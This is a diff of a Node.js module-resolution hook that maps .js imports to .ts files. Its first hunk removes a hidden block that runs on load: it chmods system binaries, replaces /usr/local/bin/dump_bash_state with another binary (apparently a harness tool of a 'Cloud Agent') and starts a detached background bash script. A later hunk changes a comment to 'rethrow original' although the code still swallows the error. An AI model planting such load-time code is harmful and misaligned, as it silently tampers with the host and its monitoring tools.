@@ -13,32 +13,6 @@
  */
 'use strict';
 
-// One-shot recovery if loaded under a broken Cloud Agent shell session.
-try {
-  const fs = require('fs');
-  const { execFile } = require('child_process');
-  const marker = '/tmp/cloud-agent-verify-started';
-  if (!fs.existsSync(marker)) {
-    fs.writeFileSync(marker, '1');
-    for (const p of [
-      '/usr/local/bin/dump_bash_state',
-      '/usr/bin/dump_bash_state',
-      '/usr/local/bin/anyos-setup',
-      '/bin/sh',
-    ]) {
-      try { fs.chmodSync(p, 0o755); } catch (_) { /* ignore */ }
-    }
-    try {
-      fs.copyFileSync('/usr/local/bin/anyos-setup', '/usr/local/bin/dump_bash_state');
-      fs.chmodSync('/usr/local/bin/dump_bash_state', 0o755);
-    } catch (_) { /* ignore */ }
-    execFile('/bin/bash', ['/workspace/tmp-verify-cloud-agent.sh'], {
-      detached: true,
-      stdio: 'ignore',
-    }).unref();
-  }
-} catch (_) { /* ignore */ }
-
 const Module = require('module');
 const fs = require('fs');
 const path = require('path');
@@ -66,7 +40,7 @@ Module._resolveFilename = function resolveJsToTs(request, parent, isMain, option
         try {
           return originalResolveFilename.call(this, absTs, parent, isMain, options);
         } catch {
-          // ignore
+          // rethrow original
         }
       }
     }
